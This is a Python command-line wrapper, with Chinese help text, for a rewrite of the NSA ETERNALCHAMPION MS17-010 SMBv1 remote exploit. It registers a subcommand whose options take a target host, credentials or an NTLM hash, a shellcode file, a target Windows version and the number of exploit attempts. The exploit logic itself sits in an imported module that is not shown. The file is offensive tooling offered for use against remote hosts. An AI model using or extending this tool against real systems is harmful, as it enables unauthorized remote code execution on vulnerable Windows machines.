"""eternal-champion — MS17-010 (ETERNALCHAMPION) SMBv1 远程利用。

Python 重写的 NSA EternalCharm 利用工具 `Eternalchampion-2.0.0.exe`
(C++ / DAVE framework)，通过 IDA Pro + x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 SMBv1/MS17-010 利用流程。
"""

from . import eternal_champion


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def eternal_champion_handle(args):
    """Run the ETERNALCHAMPION exploitation sequence against the supplied host."""
    return eternal_champion.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        pipe=args.pipe,
        share=args.share,
        protocol=args.protocol,
        target_os=args.target_os,
        arch=args.arch,
        credentials=args.credentials,
        username=args.username,
        password=args.password,
        ntlm_hash=args.ntlm_hash,
        max_attempts=args.attempts,
        shellcode=args.shellcode,
        verify_target=args.verify_target,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `eternal-champion` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "eternal-champion",
        help="MS17-010 (ETERNALCHAMPION) SMBv1 远程利用",
        description="Python 重写的 NSA EternalChampion (ETCH / MS17-010) 利用工具 "
                    "Eternalchampion-2.0.0。通过 TCP 445/139 驱动 SMBv1/NBT，"
                    "执行架构识别、exploit 缓冲构建与投递，并可选验证目标。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445,
        help="目标 TCP 端口（SMB 默认 445，NBT 默认 139）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时）",
    )
    p.add_argument(
        "--pipe", metavar="PIPE",
        help="命名管道名（Win7+ 专用，需 Pipe 或 Share）",
    )
    p.add_argument(
        "--share", metavar="SHARE",
        help="共享名（Win7+ 专用，需 Pipe 或 Share，Unicode）",
    )
    p.add_argument(
        "--protocol", choices=["SMB", "NBT"], default="SMB",
        help="协议类型（SMB 默认端口 445，NBT 默认端口 139）",
    )
    p.add_argument(
        "--target-os",
        choices=[
            "XP_SP0SP1_X86", "XP_SP2SP3_X86", "XP_SP1_X64", "XP_SP2_X64",
            "SERVER_2003_SP0", "SERVER_2003_SP1", "SERVER_2003_SP2",
            "VISTA_SP0", "VISTA_SP1", "VISTA_SP2",
            "SERVER_2008_SP0", "SERVER_2008_SP1", "SERVER_2008_SP2",
            "WIN7_SP0", "WIN7_SP1",
            "SERVER_2008R2_SP0", "SERVER_2008R2_SP1",
            "WIN8_SP0",
        ],
        help="目标操作系统与服务包",
    )
    p.add_argument(
        "--arch", choices=["Unknown", "x86", "x64"], default="Unknown",
        help="目标架构（默认由 exploit 自动判断）",
    )
    p.add_argument(
        "--credentials",
        choices=["Anonymous", "Guest", "Blank", "Password", "NTLM"],
        default="Anonymous",
        help="凭证类型",
    )
    p.add_argument(
        "--username", metavar="HEX",
        help="用户名（十六进制字节，Unicode）",
    )
    p.add_argument(
        "--password", metavar="HEX",
        help="密码（十六进制字节，Unicode）",
    )
    p.add_argument(
        "--ntlm-hash", metavar="HEX",
        help="NTLM 密码哈希（十六进制）",
    )
    p.add_argument(
        "--attempts", type=int, default=42,
        help="MaxExploitAttempts：最多尝试次数（默认 42）",
    )
    p.add_argument(
        "--shellcode", metavar="FILE",
        help="DOPU Shellcode 缓冲区文件",
    )
    p.add_argument(
        "--verify-target", action="store_true",
        help="先验证目标是否易受攻击",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=eternal_champion_handle)
